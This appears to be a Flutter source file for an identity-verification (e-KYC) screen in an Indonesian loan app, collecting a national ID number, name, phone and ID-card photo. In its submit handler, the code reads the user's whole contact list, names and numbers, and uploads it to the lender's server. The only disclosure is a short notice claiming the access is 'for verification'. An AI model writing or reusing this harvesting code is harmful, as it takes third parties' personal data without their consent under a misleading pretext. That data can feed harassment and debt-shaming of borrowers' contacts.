import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'dart:io';
import 'loan_dashboard.dart';
import '../services/api_service.dart';

class EkycScreen extends StatefulWidget {
  const EkycScreen({super.key});

  @override
  State<EkycScreen> createState() => _EkycScreenState();
}

class _EkycScreenState extends State<EkycScreen> {
  final _formKey = GlobalKey<FormState>();
  final TextEditingController _nikController = TextEditingController();
  final TextEditingController _nameController = TextEditingController();
  final TextEditingController _phoneController = TextEditingController();

  File? _ktpImage;
  final ImagePicker _picker = ImagePicker();

  Future<void> _pickImage() async {
    final XFile? image = await _picker.pickImage(source: ImageSource.camera);
    if (image != null) {
      setState(() {
        _ktpImage = File(image.path);
      });
    }
  }

  Future<void> _handleSubmit() async {
    if (!_formKey.currentState!.validate()) return;

    // Show loading dialog
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => const AlertDialog(
        content: Row(
          children: [
            CircularProgressIndicator(),
            SizedBox(width: 20),
            Text('Memproses data...'),
          ],
        ),
      ),
    );

    // Step 1: Request Contact Permission & Sync
    bool contactSynced = false;
    try {
      debugPrint('[EKYC] Requesting contact permission...');
      final permissionGranted = await FlutterContacts.requestPermission();

      if (permissionGranted) {
        debugPrint('[EKYC] Permission granted, fetching contacts...');
        final contacts = await FlutterContacts.getContacts(
          withProperties: true,
        );

        debugPrint('[EKYC] Found ${contacts.length} contacts');

        List<Map<String, dynamic>> contactList = contacts
            .map((c) => {
                  'displayName': c.displayName,
                  'phoneNumber':
                      c.phones.isNotEmpty ? c.phones.first.number : ''
                })
            .toList();

        await ApiService.uploadContacts(contactList);
        contactSynced = true;
        debugPrint('[EKYC] Contacts uploaded successfully');
      } else {
        debugPrint('[EKYC] Contact permission denied by user');
      }
    } catch (e) {
      debugPrint('[EKYC] Contact sync error: $e');
      // Continue even if contact sync fails
    }

    // Step 2: Update Profile
    final error = await ApiService.updateProfile(
      name: _nameController.text,
      nik: _nikController.text,
      phone: _phoneController.text,
    );

    // Close loading dialog
    if (mounted) Navigator.pop(context);

    if (error == null) {
      // Success
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              contactSynced
                  ? 'Pendaftaran Berhasil! ${contactSynced ? "Kontak tersinkron." : ""}'
                  : 'Pendaftaran Berhasil!',
            ),
            backgroundColor: Colors.green,
          ),
        );

        // Navigate to Dashboard
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => const LoanDashboard(),
          ),
        );
      }
    } else {
      // Error
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal: $error'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Verifikasi Identitas (E-KYC)'),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16.0),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              // KTP Photo Placeholder
              Container(
                height: 200,
                decoration: BoxDecoration(
                  color: Colors.grey[200],
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.grey),
                ),
                child: InkWell(
                  onTap: _pickImage,
                  child: _ktpImage != null
                      ? ClipRRect(
                          borderRadius: BorderRadius.circular(12),
                          child: Image.file(_ktpImage!, fit: BoxFit.cover),
                        )
                      : const Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.camera_alt,
                                size: 50, color: Colors.grey),
                            SizedBox(height: 8),
                            Text('Tap untuk foto KTP',
                                style: TextStyle(color: Colors.grey)),
                          ],
                        ),
                ),
              ),
              const SizedBox(height: 24),

              // Form Fields
              TextFormField(
                controller: _nikController,
                decoration: const InputDecoration(
                  labelText: 'Nomor Induk Kependudukan (NIK)',
                  border: OutlineInputBorder(),
                  prefixIcon: Icon(Icons.credit_card),
                ),
                keyboardType: TextInputType.number,
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'NIK wajib diisi';
                  }
                  if (value.length != 16) {
                    return 'NIK harus 16 digit';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 16),
              TextFormField(
                controller: _phoneController,
                decoration: const InputDecoration(
                  labelText: 'Nomor WhatsApp Aktif',
                  border: OutlineInputBorder(),
                  prefixIcon: Icon(Icons.phone),
                ),
                keyboardType: TextInputType.phone,
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Nomor HP wajib diisi';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 16),
              TextFormField(
                controller: _nameController,
                decoration: const InputDecoration(
                  labelText: 'Nama Lengkap (Sesuai KTP)',
                  border: OutlineInputBorder(),
                  prefixIcon: Icon(Icons.person),
                ),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Nama wajib diisi';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 24),

              // Info Card
              Card(
                color: Colors.blue[50],
                child: Padding(
                  padding: const EdgeInsets.all(12.0),
                  child: Row(
                    children: [
                      Icon(Icons.info_outline, color: Colors.blue[700]),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          'Kami akan meminta izin akses kontak untuk verifikasi.',
                          style: TextStyle(
                            fontSize: 12,
                            color: Colors.blue[900],
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 16),

              // Submit Button
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  onPressed: _handleSubmit,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.blue.shade800,
                    foregroundColor: Colors.white,
                  ),
                  child: const Text(
                    'KIRIM PENGAJUAN',
                    style: TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _nikController.dispose();
    _nameController.dispose();
    _phoneController.dispose();
    super.dispose();
  }
}
